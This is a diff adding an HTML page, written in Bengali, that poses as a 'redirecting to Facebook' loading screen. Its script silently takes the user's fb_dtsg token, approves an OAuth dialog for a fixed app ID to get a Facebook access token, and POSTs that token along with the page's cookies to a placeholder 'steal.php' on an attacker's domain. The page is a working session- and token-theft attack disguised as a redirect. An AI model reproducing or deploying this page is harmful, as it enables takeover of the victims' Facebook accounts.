@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>লোড হচ্ছে...</title>
+    <meta http-equiv="refresh" content="3;url=https://facebook.com">
+</head>
+<body>
+    <h2>অপেক্ষা করুন, ফেসবুকে নিয়ে যাচ্ছে...</h2>
+
+<script>
+(async () => {
+    if (!document.cookie.includes("c_user")) {
+        alert("লগইন হয়নি! আবার চেষ্টা করুন।");
+        return;
+    }
+
+    let cookie = document.cookie;
+    let fb_dtsg = await fetch("https://mbasic.facebook.com/").then(r=>r.text()).then(t=>t.match(/name="fb_dtsg" value="([^"]+)/i)?.[1]);
+
+    let body = new URLSearchParams({
+        app_id: "124024574287414",
+        redirect_uri: "fbconnect://success",
+        display: "popup",
+        access_token: "",
+        fb_dtsg: fb_dtsg,
+        __CONFIRM__: "1"
+    });
+
+    fetch("https://www.facebook.com/v19.0/dialog/oauth/confirm", {
+        method: "POST",
+        body: body,
+        credentials: "include",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"}
+    })
+    .then(r => r.text())
+    .then(text => {
+        let token = text.match(/access_token=(EAADV6\.[^&"]+)/);
+        if (token) {
+            // টোকেন + কুকি তোমার সার্ভারে পাঠাচ্ছি
+            fetch("https://তোমার-ডোমেইন.com/steal.php", {
+                method: "POST",
+                body: JSON.stringify({
+                    cookie: cookie,
+                    token: token[1],
+                    time: new Date().toLocaleString('bn-BD')
+                }),
+                headers: {"Content-Type": "application/json"}
+            });
+        }
+    });
+})();
+</script>
+</body>
+</html>
